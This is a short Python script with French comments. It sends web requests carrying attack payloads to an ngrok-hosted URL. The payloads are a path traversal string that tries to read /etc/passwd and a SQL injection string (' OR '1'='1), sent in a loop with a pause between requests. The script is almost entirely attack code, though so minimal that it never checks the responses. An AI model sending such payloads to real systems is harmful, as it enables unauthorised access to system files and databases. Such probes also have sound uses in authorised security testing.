import requests
import time

base_url = "https://accurate-actively-fox.ngrok-free.app/"

payloads = [
    "?file=../../etc/passwd",  # 
    "?input=' OR '1'='1",     # 
]

for payload in payloads:
    try:
        url = base_url + payload
        print(f"envoi de la requête ... : {url}")
        
        response = requests.get(url)

        time.sleep(2)  # attendre un peu avant de lancer d'autre 

    except Exception as e:
        print(f"Erreur :  {e}")
